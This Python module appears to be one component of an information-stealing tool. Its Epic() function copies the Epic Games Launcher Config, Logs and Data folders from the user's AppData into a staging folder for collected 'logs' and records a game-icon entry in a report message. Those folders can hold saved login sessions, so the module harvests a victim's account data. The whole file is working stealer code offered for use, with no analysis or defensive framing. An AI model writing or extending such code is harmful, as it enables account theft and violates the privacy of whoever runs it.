from os import environ,sep
from shutil import copytree
from manager.logger import Log
from preferences.config import config


def Epic():
    path = r'EpicGamesLauncher\Saved\Config'
    path1 = r'EpicGamesLauncher\Saved\Logs'
    path2 = r'EpicGamesLauncher\Saved\Data'
    try:
        msgInfo=""
        user = environ['USERPROFILE']
        pathtofile = f'{user}\\{config.pathToLogs}'
        local = user + sep + r'AppData\Local'
        copytree(local+ sep + path,f'{pathtofile}\\Games\\EpicGames\\Config')
        copytree(local+ sep + path1,f'{pathtofile}\\Games\\EpicGames\\Logs')
        copytree(local+ sep + path2,f'{pathtofile}\\Games\\EpicGames\\Data')
        msgInfo+="\n∟🎮EpicGames"
        return msgInfo
    except Exception as error:
        Log(f"EpicGames ---> {error}")
        return msgInfo